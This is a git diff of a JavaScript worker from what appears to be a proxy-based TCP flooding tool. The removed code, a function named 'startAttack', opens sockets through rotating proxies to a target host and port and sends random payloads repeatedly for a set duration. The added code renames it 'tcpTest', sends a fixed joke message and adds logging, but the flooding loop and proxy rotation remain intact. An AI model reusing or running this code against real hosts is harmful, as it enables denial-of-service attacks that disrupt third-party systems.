@@ -70,12 +70,13 @@ export function createTcpClient(
   return socket;
 }
 
-const startAttack = () => {
-  const { target, proxies, duration, packetDelay, packetSize } = workerData;
-
+const tcpTest = () => {
+  const { target, proxies, duration, sillyMessage } = workerData;
   const [targetHost, targetPort] = target.split(":");
   const port = parseInt(targetPort, 10);
   const fixedTarget = target.startsWith("http") ? target : `tcp://${target}`;
+
+  const packetDelay = 100;
 
   if (isNaN(port)) throw new Error("Invalid port: Should be a number");
   if (port < 1 || port > 65535)
@@ -90,14 +91,28 @@ const startAttack = () => {
     socket.on("connect", () => {
       totalPackets++;
 
+      const message = `Hello from Big Chungus`;
+      //socket.write(message);
+
       parentPort.postMessage({
-        log: `✅ Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
+        log: `📨 Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port}`,
         totalPackets,
       });
-
+            parentPort.postMessage({
+        log: `to ${fixedTarget} `,
+        totalPackets,
+      });
+            parentPort.postMessage({
+        log: `Message sent: ${message}`,
+        totalPackets,
+      });
       const interval = setInterval(() => {
         if (socket.writable && socket["open"]) {
-          socket.write(randomString(packetSize));
+          socket.write(sillyMessage);
+          parentPort.postMessage({
+            log: `📨 Sent random: ${sillyMessage}`,
+            totalPackets,
+          });
         } else {
           clearInterval(interval);
         }
@@ -117,7 +132,7 @@ const startAttack = () => {
 
     if (elapsedTime >= duration) {
       clearInterval(interval);
-      parentPort.postMessage({ log: "Attack finished", totalPackets });
+      //parentPort.postMessage({ log: "Attack finished", totalPackets });
       process.exit(0);
     }
 
@@ -127,5 +142,5 @@ const startAttack = () => {
 };
 
 if (workerData) {
-  startAttack();
+  tcpTest();
 }
